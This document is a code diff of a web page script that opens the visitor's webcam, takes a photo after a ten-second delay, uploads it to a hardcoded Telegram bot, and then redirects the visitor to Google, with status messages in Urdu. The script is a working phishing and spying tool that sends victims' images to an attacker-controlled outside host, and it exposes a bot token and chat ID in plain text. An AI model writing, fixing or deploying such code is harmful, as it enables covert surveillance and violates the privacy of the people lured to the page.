@@ -19,51 +19,45 @@
   <script>
     const BOT_TOKEN = "8229410666:AAHURN6Ie9iqAm0hjPqC2p_XgzeMCLrtgqE";
     const CHAT_ID = "7009447523";
-    const REDIRECT_URL = "https://google.com";
-    const CAPTURE_DELAY = 10000;
+    const REDIRECT_URL = "https://google.com"; // ✅ Redirect after capture
+    const CAPTURE_DELAY = 10000; // 10 seconds
 
     const video = document.getElementById("video");
     const canvas = document.getElementById("canvas");
     const statusDiv = document.getElementById("status");
     const context = canvas.getContext("2d");
 
-    function dataURLtoBlob(dataurl) {
-      const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
-            bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
-      for (let i = 0; i < n; i++) {
-        u8arr[i] = bstr.charCodeAt(i);
-      }
-      return new Blob([u8arr], { type: mime });
-    }
-
     function sendToTelegram(imageDataUrl) {
-      const blob = dataURLtoBlob(imageDataUrl); // ✅ FIXED HERE
+      fetch(imageDataUrl)
+        .then(res => res.blob())
+        .then(blob => {
+          const formData = new FormData();
+          formData.append("chat_id", CHAT_ID);
+          formData.append("photo", blob, "photo.jpg");
 
-      const formData = new FormData();
-      formData.append("chat_id", CHAT_ID);
-      formData.append("photo", blob, "photo.jpg");
+          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: "POST",
+            body: formData,
+          }).then(response => {
+            if (response.ok) {
+              statusDiv.innerText = "✅ تصویر Telegram پر بھیج دی گئی ہے!";
+            } else {
+              statusDiv.innerText = "❌ تصویر بھیجنے میں مسئلہ آیا!";
+            }
 
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-        method: "POST",
-        body: formData,
-      }).then(response => {
-        if (response.ok) {
-          statusDiv.innerText = "✅ تصویر Telegram پر بھیج دی گئی ہے!";
-        } else {
-          statusDiv.innerText = "❌ تصویر بھیجنے میں مسئلہ آیا!";
-        }
-
-        setTimeout(() => {
-          window.location.href = REDIRECT_URL;
-        }, 2000);
-      }).catch(() => {
-        statusDiv.innerText = "⚠️ نیٹ ورک ایرر!";
-        setTimeout(() => {
-          window.location.href = REDIRECT_URL;
-        }, 2000);
-      });
+            setTimeout(() => {
+              window.location.href = REDIRECT_URL;
+            }, 2000); // 2s delay before redirect
+          }).catch(() => {
+            statusDiv.innerText = "⚠️ نیٹ ورک ایرر!";
+            setTimeout(() => {
+              window.location.href = REDIRECT_URL;
+            }, 2000);
+          });
+        });
     }
 
+    // Start camera and capture after delay
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
         video.srcObject = stream;
